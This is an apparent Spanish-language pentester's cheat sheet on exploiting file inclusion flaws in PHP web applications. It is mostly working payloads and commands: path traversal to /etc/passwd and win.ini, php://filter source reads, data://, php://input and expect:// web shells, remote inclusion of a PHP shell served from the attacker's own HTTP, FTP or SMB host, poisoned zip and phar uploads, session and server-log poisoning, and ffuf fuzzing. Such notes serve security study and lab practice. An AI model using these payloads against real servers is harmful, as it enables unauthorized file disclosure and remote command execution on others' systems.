### LFI

intentar movimientos de path transversal:
tricks:
agregar una / si el parametro responde solo a archivos con una nomenclatura: "lang_".
agregar recursividad para que, al limpiar, el filtro elimine los bad chars permitiendonos generar uno nuevo: ....// el filtro
buscará "../" este patrón, al eliminarlo nos quedará nuevamente un "../"
encodear en unrl una o más veces el payload.

#### filtros php:

podemos usar filtros php para poder leer el código fuente de archivos: php://filter/read=convert.base64-encode/resource=config

podemos encontrar posibilidades de path transversal en la carga de objetos externos dentro del html:

        <img src="/loadImage?filename=218.png">

podríamos utilizar esta funcionalidad encontrada en el img dentro de la barra de búsqueda:

        https://insecure-website.com/loadImage?filename=../../../etc/passwd

mismo ejemplo en windows:

        https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini


Cuando abrimos un archivo alojado en el servidor como por ejemplo, una imagen (accediendo al archivo en sí) podemos interceptar
la request e intentar, si hay una variable de entorno que lo llama, un path transversal

Aveces la funcionalidad que carga los archivos tiene una validación de extensión para determinar que el file es el correcto.
esto podemos bypassearlo agregando algunos chars como 00%:
        filename=../../../etc/passwd%00.png

### RCE

podemos lograr rce utilizando el filtro "data" si el parametro allow_url_include se encuentra habilitado:

##### idea:
                data://text/plain;base64,"web shell en base64"&"parametro de la shell"="comando"

##### aplicación:

                data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd="comando"

para métodos POST podemos utilizar el filtro "input":

##### ejemplo en curl:


                curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid

En algunos casos los servidores pueden tener instalado el filtro expect que permite en sí mismo correr comandos:


##### ejemplo en curl:
                curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"




#########################################RFI

Una buena forma de probar RFI es inducando un servicio interno, como por ejemplo "http:127.0.0.1:80/index.php". De esta manera
si el RFI es posible, cargará la página principal en el espacio debido.

Luego podemos levantar distintos tipos de servidores donde alijamos una shell php.

http:  sudo python3 -m http.server <LISTENING_PORT> (http://<OUR_IP>/shell.php&cmd=id)
ftp: sudo python -m pyftpdlib -p 21 (ftp://<OUR_IP>/shell.php&cmd=id)
smb: impacket-smbserver -smb2support share $(pwd) (este se usaría: \\<OUR_IP>\share\shell.php&cmd=whoami)


########################fileuploads

###################SUbir imagenes envenenadas
podemos subir imagenes envenenadas y aprovechar el LFI para acceder a las mismas con ejecución de código:

http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id


################Zip FILES
podemos aprovechar también, si se encuentra permitida, la subida de archivos zip para crear un archivo Zip con 
extensión JPG:
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id


############### PHAR files
Podemos aprovechar también los PHAR:

creamos una shell con el siguiente código:
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();

luego:
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg

luego lo subimos y ejecutamos:
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id



###########################LOG POISONING:

podemos envenenar un logs sobre los que tenga privilegios de lectura:


############PHP SESSION POISONING:

CUando un sitio usa una cookie PHPSESSID, guarda estos archivos en el backend:
en linux: /var/lib/php/sessions/
windows: C:\Windows\Temp\
si la cookie tiene el valor "el4ukv0kqbvoirg7nkp4dncpk3" será guardada en /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3

Si podemos acceder a nuestra session por medio de LFI, podemos ver los parametros que guarda y relacionarlos con los parametros
que podemos controlar dentro del sitio, ejemplo: si el sitio nos permite cambiar de lenguaje, este sería un excelete parametro.
podríamos cambiar el valor de el parametro con LFI por cualquier otro dato:
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
luego ingresar nuevamente al log de la sesión y ver si este último dato se encuentra en el mismo.
Podríamos entonces agregar una shell simple:
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
y luego evocarla desde el FLI
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id


#############Server log poisoning

apache y ngnx guardan varios logs como access.log y error.log

el access.log guarda request hechas al server, y entre todos los campos podemos encontrar el user-agent. Si podemos acceder a
este log, con modificar el user-agent en una request podemos acceder a una shell.
Ngnx permite esta lectura a usuarios con bajos privilegios, mientras que apache solo a admins o roots(aunque en versiones viejas
o mal configuradas puede funcionar)
los logs de apache están guardados por default en:
linux : /var/log/apache2/
windows: C:\xampp\apache\logs\

mientras que en nginx:
linux: /var/log/nginx/
windows: C:\nginx\log\

podriamos visitar alguno de estos logs envenenando el user agent, luego cuando los volvamos a visitar, podríamos agregar el
parametro de la shell y tirar comandos


podemos probar esto en otros logs como:

    /var/log/sshd.log
    /var/log/mail
    /var/log/vsftpd.log
Dependiendo de a qué tengamos acceso.


También podemos probar envenenar los proc /proc/self/environ o /proc/self/fd/(N) (N es un número usualmente de 0 a 50)

################################## Automatización:




Podemos buscar parámetros con fuff y luego probar con el intruder de burp la lista "SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"
Parametros:
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value'

valores:
ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ'


###Relative paths:

Algunas veces no sabémos cómo llegar a un archivo envenenado que subimos. podemos usar listas específicas con fuff para
determinar el path de de la web:
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
Esta lista tiene su par en windows en el mismo directorio.

###log paths:

listas recomendadas:

https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287




